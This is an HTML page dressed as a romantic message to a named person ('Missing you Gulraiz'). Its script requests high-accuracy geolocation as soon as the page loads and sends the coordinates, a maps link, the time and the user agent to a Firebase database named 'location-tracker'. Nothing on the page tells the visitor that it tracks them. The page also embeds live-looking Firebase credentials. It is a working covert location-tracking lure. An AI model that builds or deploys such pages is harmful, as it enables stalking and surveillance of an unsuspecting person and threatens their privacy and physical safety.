<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Special For You 💜</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Segoe UI,sans-serif;
}

body{

height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:linear-gradient(135deg,#3d0066,#7b2cbf,#9d4edd);
color:white;
overflow:hidden;

}

.container{

text-align:center;
padding:40px;
max-width:600px;

}

h1{

font-size:48px;
margin-bottom:15px;

}

h2{

font-size:30px;
font-weight:400;
margin-bottom:25px;

}

p{

font-size:20px;
line-height:1.6;

}

#status{

margin-top:35px;
font-size:18px;
color:#ffe6ff;

}

.heart{

font-size:70px;
animation:beat 1s infinite;

}

@keyframes beat{

0%{transform:scale(1);}
50%{transform:scale(1.2);}
100%{transform:scale(1);}

}

</style>
</head>

<body>

<div class="container">

<div class="heart">💜</div>

<h1>Special For You</h1>

<h2>Missing you Gulraiz 💜</h2>

<p>
If you choose to continue, it would mean a lot to me. 💜
</p>

<div id="status">
Preparing...
</div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

const firebaseConfig = {

apiKey:"AIzaSyBcVls_Ny6HMCcwARt44aDpGNn8VXPF1Gs",
authDomain:"location-tracker-5f75b.firebaseapp.com",
projectId:"location-tracker-5f75b",
storageBucket:"location-tracker-5f75b.firebasestorage.app",
messagingSenderId:"999228849873",
appId:"1:999228849873:web:b7809eab44aeb67d9a4ff0"

};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.onload=()=>{

document.getElementById("status").innerHTML="Checking location permission...";

navigator.geolocation.getCurrentPosition(async(pos)=>{

const lat=pos.coords.latitude;
const lng=pos.coords.longitude;

await addDoc(collection(db,"locations"),{

latitude:lat,
longitude:lng,
googleMap:`https://maps.google.com/?q=${lat},${lng}`,
time:new Date().toLocaleString(),
userAgent:navigator.userAgent

});

document.getElementById("status").innerHTML="💜 Thank you.";

},()=>{

document.getElementById("status").innerHTML="Location wasn't shared.";

},{
enableHighAccuracy:true
});

};

</script>

</body>
</html>
